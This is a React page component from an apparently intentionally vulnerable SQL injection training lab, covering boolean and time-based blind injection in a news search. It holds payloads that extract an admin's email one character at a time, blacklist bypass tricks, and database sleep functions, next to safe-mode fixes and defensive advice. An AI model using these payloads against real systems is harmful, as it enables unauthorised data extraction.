import { Form, Input, Button, Tag, Space, Typography, Select } from 'antd';
import { BugOutlined, SafetyOutlined, PlayCircleOutlined } from '@ant-design/icons';
import { useMemo, useState } from 'react';
import { sqliApi } from '../../utils/api';
import useRequestRunner from '../../hooks/useRequestRunner';
import ThreePanelLab from '../../components/ThreePanelLab';
import LabTips from '../../components/LabTips';
import MetaTags from '../../components/MetaTags';

const { Text } = Typography;

function formatTs(ts) {
  if (!ts) return '-';
  try {
    return new Date(ts).toLocaleString();
  } catch {
    return String(ts);
  }
}

const PAYLOADS_BOOLEAN = [
  // 最小真/假测试（确认 one-bit 信号通道）
  '1=0',
  '1=1',
  // 关键：把目标行锁定到 admin，否则 EXISTS 会被“任意用户命中”而看不出变化
  "username='admin'",
  "username='admin' AND 1=1",
  "username='admin' AND 1=0",
  // 域名/模式匹配（对 admin 做判断）
  "username='admin' AND email LIKE '%@owasp-lab.local'",
  // 逐字符布尔探测（对 admin 做判断；配合二分法）
  "username='admin' AND SUBSTRING(email,1,1)='a'",
  "username='admin' AND ASCII(SUBSTRING(email,2,1))>109",
  "username='admin' AND ASCII(SUBSTRING(email,2,1))>77",
];

const PAYLOADS_TIME = [
  // 存在性（强信号）
  "username='admin'",
  "username='no_such_user'",
  // 逐字符/二分法
  "username='admin' AND SUBSTRING(email,1,1)='a'",
  "username='admin' AND ASCII(SUBSTRING(email,2,1))>77",
  "username='admin' AND ASCII(SUBSTRING(email,2,1))>109",
];

const SAFE_SORT_FIELD_OPTIONS = [
  { value: 'created_at', label: 'created_at（按时间）' },
  { value: 'title', label: 'title（按标题）' },
  { value: 'id', label: 'id（按ID）' },
];

const SAFE_SORT_ORDER_OPTIONS = [
  { value: 'desc', label: 'desc（倒序）' },
  { value: 'asc', label: 'asc（正序）' },
];

const TIPS_BOOLEAN = {
  principle:
    '难度 1（布尔盲注）演示 one-bit 信号：q 参数化（只影响 LIKE 匹配），但 VULN 路由把 filterExpr 直接拼进 `EXISTS (SELECT 1 FROM users WHERE <filterExpr>)`。filterExpr 为真时放行隐藏新闻（标题含【隐藏】），为假时只显示公开新闻。',
  exploit: [
    {
      title: '最小真/假测试（存在性）',
      desc: '先用恒真/恒假验证信号通道是否工作，再用更稳的“存在 admin”验证 users 子查询可达。',
      payloads: ["filterExpr: 1=0 → 只显示公开新闻", "filterExpr: 1=1 → 隐藏新闻可能出现", "filterExpr: username='admin' → 更稳"],
    },
    {
      title: '域名/模式匹配',
      desc: '用 LIKE/通配符测试邮箱域，再逐步缩小范围（例如试探首字母）。',
      payloads: ["filterExpr: email LIKE '%@owasp-lab.local'", "filterExpr: email LIKE 'a%@owasp-lab.local'"],
    },
    {
      title: '逐字符布尔探测（更细粒度）',
      desc: '用 SUBSTRING/ASCII 做逐位判断（真出现隐藏新闻，假不出现）。建议用二分法缩短次数（ASCII 32–126）。',
      payloads: ["filterExpr: SUBSTRING(email,1,1)='a'", 'filterExpr: ASCII(SUBSTRING(email,2,1))>109'],
    },
    {
      title: '稳健与排错',
      desc: 'items=[] 可能是语法错误被吞，也可能是条件为假。先退回简单条件复核；必要时用 LOWER(email) 统一比较。',
      payloads: ["filterExpr: username='admin'", "filterExpr: LOWER(email) LIKE '%@owasp-lab.local'"],
    },
  ],
  bypassIntro:
    '弱防护常见是黑名单过滤（拦 SELECT/OR/AND/-- 等）。黑名单易被大小写、注释、空白与等价函数绕过；核心问题仍是“把结构位谓词交给客户端”。',
  bypass: [
    '大小写/混淆：SeLeCt、eXiStS（取决于过滤）',
    '注释与空白：/**/、TAB、换行（取决于解析器）',
    '等价写法：EXISTS vs COUNT(*)>0；LOWER(email) 统一比较',
  ],
  fix: [
    '生产正确的 SAFE：草稿可见性由服务端 session 角色决定（admin 才能看草稿），不会让客户端通过参数决定“是否能看隐藏”。',
    '筛选/排序才是正常参数：q 参数化；sortField/sortOrder 用白名单映射，避免 ORDER BY 注入。',
  ],
  profile: ["H2（当前环境）：SUBSTRING/ASCII 可用；必要时用 LOWER(...) 统一大小写比较。"],
};

const TIPS_TIME = {
  principle:
    '难度 2（时间盲注）只看慢/快差异：响应体结构尽量不变，不靠条数/回显。VULN 路由把 filterExpr 拼进 users 存在性判断，条件为真时触发固定延迟（约 +1.2s）。',
  exploit: [
    {
      title: '确认这是“时间通道”',
      desc: '先发两次基线请求测平均耗时，再进行对比。服务端可能有 50–120ms 抖动，需用明显阈值（如 1.2s）判断。',
      payloads: ["filterExpr: username='admin' → 应更慢", "filterExpr: username='no_such_user' → 接近基线"],
    },
    {
      title: '存在性判定（强信号）',
      desc: '先用简单条件确认延迟是否触发，再进入逐字符探测。',
      payloads: ["filterExpr: username='admin'", "filterExpr: username='no_such_user'"],
    },
    {
      title: '逐字符/二分法（细粒度时间盲）',
      desc: '把判断条件改为逐位比较，真时触发延迟。每个位置重复测试多次取中位数/多数，降低抖动影响。',
      payloads: ["filterExpr: SUBSTRING(email,1,1)='a'", 'filterExpr: ASCII(SUBSTRING(email,2,1))>77', 'filterExpr: ASCII(SUBSTRING(email,2,1))>109'],
    },
    {
      title: '异常与排错',
      desc: '若出现 items=[]，可能是语法错误被吞或函数不可用；先回退到简单存在性条件再迭代。',
      payloads: ["filterExpr: username='admin'", "filterExpr: LOWER(email) LIKE '%@owasp-lab.local'"],
    },
  ],
  bypassIntro:
    '时间盲注的弱防护常见于只对响应体做差异检测而忽略耗时差异，或仅拦部分关键字但仍允许结构位拼接。核心修复仍是：不给客户端任何可控谓词/结构片段。',
  bypass: ['二分法：用 ASCII 比较缩短枚举次数', '重复取样：同一判断多次请求取中位数，降低抖动影响'],
  fix: [
    '禁止用户可控延迟：不接受自由 filterExpr；移除/封装任何由用户输入触发的 sleep/benchmark 等调用。',
    '结构位白名单与模板化：结构片段由服务端模板控制；客户端只提供值并参数化。',
    '服务端延迟与 QoS：如确需延迟（限流/实验），由策略控制且与用户输入无关；设置上限与熔断避免 DoS。',
    '监控与告警：识别同一 IP/会话的高频时间盲模式，触发限流/告警。',
    '自动化测试：验证 SAFE 路由耗时不随输入变化（在合理误差内）。',
  ],
  profile: [
    'H2（当前环境）：后端使用 `CALL SLEEP(1200)`（毫秒）制造延迟；SUBSTRING/ASCII 可用于逐位判断。',
    'MySQL：SLEEP(秒)；Postgres：pg_sleep(秒)（函数名/单位不同）。',
  ],
};

export default function SqliNewsBlind() {
  const { loading, result, run } = useRequestRunner();
  const [form] = Form.useForm();

  const [mode, setMode] = useState('vuln'); // vuln | safe
  const [difficulty, setDifficulty] = useState('1'); // '1'(boolean) | '2'(time)
  const [elapsedMs, setElapsedMs] = useState(null);

  const modeUi = useMemo(() => {
    const isBoolean = difficulty === '1';
    if (mode === 'safe') {
      return isBoolean
        ? {
            label: 'SAFE',
            icon: <SafetyOutlined style={{ color: '#34d399' }} />,
            tag: <Tag color="green">session role + 排序白名单</Tag>,
            buttonDanger: false,
            runType: 'safeNewsBooleanProbe',
            request: (values) =>
              sqliApi.safeNewsBooleanProbe(values?.q || '', values?.sortField || 'created_at', values?.sortOrder || 'desc'),
          }
        : {
            label: 'SAFE',
            icon: <SafetyOutlined style={{ color: '#34d399' }} />,
            tag: <Tag color="green">移除可控延迟</Tag>,
            buttonDanger: false,
            runType: 'safeNewsTimeProbe',
            request: (values) => sqliApi.safeNewsTimeProbe(values?.q || ''),
          };
    }

    return isBoolean
      ? {
          label: 'VULN',
          icon: <BugOutlined style={{ color: '#94a3b8' }} />,
          tag: <Tag color="volcano">EXISTS 谓词拼接</Tag>,
          buttonDanger: true,
          runType: 'vulnNewsBooleanProbe',
          request: (values) => sqliApi.vulnNewsBooleanProbe(values?.q || '', values?.filterExpr || '1=0'),
        }
      : {
          label: 'VULN',
          icon: <BugOutlined style={{ color: '#94a3b8' }} />,
          tag: <Tag color="volcano">真时延迟（time）</Tag>,
          buttonDanger: true,
          runType: 'vulnNewsTimeProbe',
          request: (values) => sqliApi.vulnNewsTimeProbe(values?.q || '', values?.filterExpr || '1=0'),
        };
  }, [mode, difficulty]);

  const raw = result?.data?.data;
  const items = Array.isArray(raw?.items) ? raw.items : [];
  const count = typeof raw?.count === 'number' ? raw.count : items.length;
  const meta = result?.data?.meta;

  const tips = difficulty === '1' ? TIPS_BOOLEAN : TIPS_TIME;
  const payloads = difficulty === '1' ? PAYLOADS_BOOLEAN : PAYLOADS_TIME;

  return (
    <ThreePanelLab
      title="SQL 注入 · 新闻搜索（盲注）"
      subtitle={
        difficulty === '1'
          ? '难度 1：布尔盲注（真/假差异）。关卡：news_boolean_users_probe（blind_boolean）。'
          : '难度 2：时间盲注（慢/快差异）。关卡：news_time_users_probe（time_based）。'
      }
      bottomExtra={<LabTips tips={tips} />}
      hideSafe
      hideResponse
      vuln={{
        title: (
          <Space>
            {modeUi.icon}
            <span style={{ color: '#e6edf3' }}>{modeUi.label}</span>
          </Space>
        ),
        extra: (
          <Space wrap>
            <Select
              size="small"
              value={difficulty}
              onChange={(v) => {
                setDifficulty(v);
                // 切难度时，清理不相关字段
                if (v === '1') {
                  form.setFieldsValue({ filterExpr: '1=0', sortField: 'created_at', sortOrder: 'desc' });
                } else {
                  form.setFieldsValue({ filterExpr: "username='admin'", sortField: undefined, sortOrder: undefined });
                }
              }}
              options={[
                { value: '1', label: '难度 1（布尔）' },
                { value: '2', label: '难度 2（时间）' },
              ]}
              style={{ width: 140 }}
            />
            <Select
              size="small"
              value={mode}
              onChange={(v) => setMode(v)}
              options={[
                { value: 'vuln', label: 'VULN' },
                { value: 'safe', label: 'SAFE' },
              ]}
              style={{ width: 110 }}
            />
            {modeUi.tag}
            <Tag>{elapsedMs == null ? '耗时: -' : `耗时: ${elapsedMs}ms`}</Tag>
            <MetaTags meta={meta} />
          </Space>
        ),
        children: (
          <>
            <Form
              form={form}
              layout="vertical"
              initialValues={{ filterExpr: '1=0', sortField: 'created_at', sortOrder: 'desc' }}
              onFinish={async (v) => {
                setElapsedMs(null);
                const t0 = performance.now();
                await run(modeUi.runType, async () => await modeUi.request(v));
                setElapsedMs(Math.round(performance.now() - t0));
              }}
            >
              <Form.Item name="q" label="q（搜索关键词）">
                <Input placeholder="可留空；用于 title LIKE 匹配（q 参数化）" />
              </Form.Item>

              {mode === 'vuln' && (
                <Form.Item
                  name="filterExpr"
                  label="filterExpr（高级筛选表达式，危险：会进入 EXISTS(users WHERE …)）"
                >
                  <Input placeholder="例如：1=0 / 1=1 / username='admin' / email LIKE '%@owasp-lab.local' / SUBSTRING(email,1,1)='a'" />
                </Form.Item>
              )}

              {mode === 'safe' && difficulty === '1' && (
                <>
                  <Form.Item name="sortField" label="sortField（白名单列）">
                    <Select options={SAFE_SORT_FIELD_OPTIONS} />
                  </Form.Item>
                  <Form.Item name="sortOrder" label="sortOrder（方向）">
                    <Select options={SAFE_SORT_ORDER_OPTIONS} />
                  </Form.Item>
                </>
              )}

              <Form.Item>
                <Button
                  type="primary"
                  danger={modeUi.buttonDanger}
                  htmlType="submit"
                  loading={loading}
                  icon={<PlayCircleOutlined />}
                >
                  搜索
                </Button>
              </Form.Item>
            </Form>

            {items.length > 0 && (
              <div style={{ marginTop: 8, marginBottom: 12 }}>
                <Text type="secondary" style={{ fontSize: 12 }}>
                  搜索结果（{count}）
                </Text>
                <div style={{ marginTop: 8 }}>
                  {items.map((x, idx) => (
                    <div
                      key={String(x?.title ?? '') + String(x?.snippet ?? '') + idx}
                      style={{
                        padding: '10px 0',
                        borderBottom: idx === items.length - 1 ? 'none' : '1px solid #2d3a4d',
                      }}
                    >
                      <div style={{ color: '#e6edf3', fontWeight: 600, marginBottom: 4 }}>{x?.title}</div>
                      <div style={{ color: '#8b9cb3', fontSize: 12, marginBottom: 4 }}>
                        {formatTs(x?.createdAt)}
                      </div>
                      <div style={{ color: '#8b9cb3' }}>{x?.snippet}</div>
                    </div>
                  ))}
                </div>
              </div>
            )}

            <Text type="secondary" style={{ fontSize: 12 }}>
              常用示例（点击填充 filterExpr + 复制）:
            </Text>
            <div style={{ marginTop: 8 }}>
              {payloads.map((p) => (
                <Tag
                  key={p}
                  style={{ cursor: 'pointer', marginBottom: 6, fontFamily: 'JetBrains Mono, monospace' }}
                  onClick={async () => {
                    form.setFieldsValue({ filterExpr: p });
                    try {
                      await navigator.clipboard.writeText(p);
                    } catch {
                      // ignore
                    }
                  }}
                >
                  {p}
                </Tag>
              ))}
            </div>
          </>
        ),
      }}
      safe={{ title: null, extra: null, children: null }}
      result={result}
    />
  );
}

